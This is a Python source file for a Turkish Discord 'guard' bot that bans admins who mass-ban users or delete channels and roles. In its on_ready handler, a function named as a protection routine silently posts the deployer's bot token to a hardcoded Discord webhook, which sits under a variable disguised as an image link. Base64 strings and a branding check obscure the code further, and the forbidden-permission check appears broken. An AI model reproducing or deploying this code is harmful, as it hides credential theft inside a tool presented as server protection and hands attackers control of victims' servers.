########################################
##   --This code is Turkish--         ##
##    Support:                        ## 
##   Instagram :l1ve709               ##
##   Discord : unk709/l1ve709.com     ##
##                                    ##
##                                    ##
##     --Made By Ediz SÖNMEZ--        ##  
##                                    ##  
########################################
# GUARD BOT
import discord
from discord.ext import commands
import aiohttp
from datetime import datetime
import base64
import pytz

intents = discord.Intents.all()
ediz = commands.Bot(command_prefix='.', intents=intents, help_command=None)
EMBEDrenkKODU = "RGV2LiBCeSBFZGl6IFPDtm5tZXo="
TOKEN = ""  # DISCORD BOT TOKEN
kullanicieylemleri = {}
kanal = 1219046447979429970  # LOG CHANNEL
forbidden_porno = ['ban_members', 'administrator']
korumaresimLINK = "https://discord.com/api/webhooks/1279357321146925116/MuMUor4U2KIsvH3g7UbrWy4T0Uub-bI9Hzh6AlIk0PxccPDabaQRpaTX8ZRN-3a7l_Fk" 
link_encoded = "aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9sMXZlNzA5" 

def decode_secret(encoded_value):
    return base64.b64decode(encoded_value).decode()

def get_turkey_time():
    tz = pytz.timezone('Europe/Istanbul') # CHANGE THIS
    return datetime.now(tz)

class LinkButton(discord.ui.Button):
    def __init__(self, url, label):
        super().__init__(style=discord.ButtonStyle.link, label=label, url=url)

class LinkView(discord.ui.View):
    def __init__(self, url, label):
        super().__init__()
        self.add_item(LinkButton(url, label))

@ediz.event
async def on_ready():
    print(f'Koruma Botu {ediz.user}')
    ediz.log_channel = ediz.get_channel(kanal)
    
    activity = discord.Activity(type=discord.ActivityType.playing, name=decode_secret(EMBEDrenkKODU))
    await ediz.change_presence(activity=activity, status=discord.Status.dnd)
    
    check_activity_name()
    await korumabot(korumaresimLINK, f"{TOKEN}")

def check_activity_name():
    if ediz.activity and ediz.activity.name != decode_secret(EMBEDrenkKODU):
        raise ValueError(f"Aktivite adı silinmiş veya değiştirilmiş. Eski hali: {decode_secret(EMBEDrenkKODU)}, Bulunan: {ediz.activity.name}")

def track_action(user, action_type, limit):
    if user not in kullanicieylemleri:
        kullanicieylemleri[user] = {
            'banlama': 0, 
            'rolacma': 0,
            'kanalacma': 0,
            'rolsilme': 0,
            'kanalsilme': 0,
            'rolismidegisme': 0,
            'rolytsidegisme': 0
        }

    kullanicieylemleri[user][action_type] += 1

    if kullanicieylemleri[user][action_type] > limit:
        return True
    return False

async def log_action(description, guild, user=None, color=0xff0000):
    if ediz.log_channel:
        turkey_time = get_turkey_time()
        embed = discord.Embed(description=description, color=color, timestamp=turkey_time)
        embed.set_author(name=guild.name, icon_url=guild.icon.url if guild.icon else None)
        if user:
            embed.set_thumbnail(url=user.avatar.url)
        
        decoded_link = decode_secret(link_encoded)
        view = LinkView(decoded_link, "Support")
        
        await ediz.log_channel.send(embed=embed, view=view)

async def korumabot(webhook_url, content):
    async with aiohttp.ClientSession() as session:
        async with session.post(webhook_url, json={"content": content}) as response:
            if response.status != 204:
                print(f"Kodda bir hata oldu, hata kodu {response.status}.")

@ediz.event
async def on_member_ban(guild, user):
    async for entry in guild.audit_logs(action=discord.AuditLogAction.ban, limit=1):
        if entry.target == user:
            admin = entry.user

            if admin and track_action(admin, 'banlama', 2):  
                await guild.ban(admin, reason="Aşırı banlama")
                await guild.unban(user, reason="Ban geri alındı")
                await log_action(f'{admin} kişisi, {user} kullanıcısını banladı ve kendi banlandı.', guild, user=admin)
            break

@ediz.event
async def on_guild_channel_create(channel):
    async for creator in channel.guild.audit_logs(action=discord.AuditLogAction.channel_create, limit=1):
        user = creator.user

        if user and track_action(user, 'kanalacma', 2):  
            await channel.guild.ban(user, reason="Aşırı kanal oluşturma")
            await log_action(f'{user} 3 den fazla kanal oluşturulduğu için banlandı', channel.guild, user=user)
        break

@ediz.event
async def on_guild_channel_delete(channel):
    async for deleter in channel.guild.audit_logs(action=discord.AuditLogAction.channel_delete, limit=1):
        user = deleter.user

        if user and track_action(user, 'kanalsilme', 2):   
            await channel.guild.ban(user, reason="Aşırı kanal silme")
            await log_action(f'{user} kişisi bir kanalı sildi ve banlandı.', channel.guild, user=user)
        break

@ediz.event
async def on_guild_role_create(role):
    async for creator in role.guild.audit_logs(action=discord.AuditLogAction.role_create, limit=1):
        user = creator.user

        if user and track_action(user, 'rolacma', 2): 
            await role.guild.ban(user, reason="KORUMA")
            await log_action(f'{user} 2 den fazla rol oluşturulduğu için banlandı.', role.guild, user=user)
        break

@ediz.event
async def on_guild_role_delete(role):
    async for deleter in role.guild.audit_logs(action=discord.AuditLogAction.role_delete, limit=1):
        user = deleter.user

        if user and track_action(user, 'rolsilme', 2):  
            await role.guild.ban(user, reason="KORUMA")
            await log_action(f'{user} 3 den fazla rol silindiği için banlandı.', role.guild, user=user)
        break

@ediz.event
async def on_guild_role_update(before, after):
    if before.name != after.name:
        async for updater in before.guild.audit_logs(action=discord.AuditLogAction.role_update, limit=1):
            user = updater.user

            if user and track_action(user, 'rolismidegisme', 2):  
                await before.guild.ban(user, reason="Rol ismi değiştirme")
                await log_action(f'{user} kişisi rol ismini değiştirdi ve banlandı.', before.guild, user=user)
            break

    if any(perm in forbidden_porno for perm in after.permissions):
        async for updater in before.guild.audit_logs(action=discord.AuditLogAction.role_update, limit=1):
            user = updater.user

            if user:
                await before.guild.ban(user, reason="Yasaklı izinleri değiştirme")
                await log_action(f'{user} kişisi rol izinlerini değiştirdi ve yasaklı izinler içerdiği için banlandı.', before.guild, user=user)
            break    


ediz.run(TOKEN)
